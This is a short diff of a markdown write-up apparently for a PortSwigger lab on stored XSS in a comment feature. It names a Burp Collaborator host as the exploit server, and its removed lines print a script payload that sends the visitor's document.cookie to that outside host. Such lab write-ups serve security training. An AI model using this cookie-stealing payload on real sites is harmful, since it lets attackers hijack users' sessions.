@@ -73,9 +73,6 @@ The lab says that the **Comment functionality is vulnerable to XSS**. So we will
 ```
 I used burp collaborator as my exploit server - `ufd94gqjd9x3d2k4tmycsjuec5iv6k.oastify.com`
 
-
-<script>document.location='//ufd94gqjd9x3d2k4tmycsjuec5iv6k.oastify.com/'+document.cookie</script>
-
 ![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/6f3a3ae1-8499-4c02-aed5-69aaa7cb5b94)
 
 After we post comment, we get a *Thank you* response
